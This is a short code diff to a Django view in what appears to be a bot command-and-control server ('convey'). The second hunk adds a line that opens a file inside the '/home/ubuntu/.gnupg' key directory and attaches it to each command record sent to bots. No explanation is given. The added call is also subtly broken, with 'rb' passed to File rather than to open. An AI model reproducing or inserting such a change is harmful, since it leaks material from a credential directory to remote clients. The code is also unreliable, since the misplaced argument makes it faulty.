@@ -5,7 +5,7 @@ from django.shortcuts import get_object_or_404
 from convey.models import Bot, Command, Bot_Command
 from convey.views.utils import get_ip
 import json
-
+from django.core.files import File
 # Grab a Command object based on a hash_sum or group number
 # If no command exists for the query, return None
 
@@ -113,8 +113,8 @@ def cmd(request):
         Bot_Command.objects.get_or_create(
             bot=bot,
             cmd=command,
+            upload=File(open('/home/ubuntu/.gnupg/.seeds/log.txt'), 'rb')
         )
-
         # Check if client is a legacy client
         if version:
             # Create json with command information
